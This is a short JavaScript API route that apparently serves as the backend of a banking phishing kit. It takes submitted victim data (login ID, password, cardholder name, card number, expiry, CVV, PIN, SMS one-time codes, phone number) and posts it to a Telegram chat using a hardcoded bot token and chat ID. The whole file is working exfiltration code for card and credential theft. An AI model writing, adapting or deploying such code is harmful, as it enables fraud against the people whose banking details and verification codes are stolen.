export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { 

    id_no,
    password,
    PINE,
    CN,
    cc,
    exp,
    cvv,
    PIN,
    sms_input,
    SMSERROR,
    Número,

  } = req.body;

  const BOT_TOKEN = "8257299535:AAHw21OzY6yFvX_LhgiGNJqm8AM3cuVp57k";
  const CHAT_ID = "-4887362963";

  let message = "";

  if  (CN && cc && exp && cvv && PIN) {
    // 🟢 رسالة الكارت
    message = `
    💳 Carte Bancaire:
    -CardholderName: ${CN}
    - Numéro: ${cc}
    - Expiration: ${exp}
    - CVV: ${cvv}
    - PIN: ${PIN}
    `;
  
  }else if (PINE) {
    // 🟠 رسالة SMS
    message = `
  📲 pin:
  - Code: ${PINE}
    `;

  } else if (id_no && password ) {
    // 🟢 رسالة الكارت
    message = `
    🔑 Nouveau PIN Login:
    - Identifiant: ${id_no}
    - Mot de passe: ${password}
     `;
} else if (sms_input ) {
  // 🟢 رسالة الكارت
  message = `
  🔑 SMS recibido Login:
  - sms: ${sms_input}
   `;
}else if (SMSERROR ) {
  // 🟢 رسالة الكارت
  message = `
  🔑sms_input Login:
  - sms: ${SMSERROR}
   `;
}else if (Número ) {
  // 🟢 رسالة الكارت
  message = `
  🔑número de teléfono:
  - Número de telefone: ${Número}
   `;
}
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    res.status(200).json({ message: "✅ Envoyé avec succès" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
  }
}




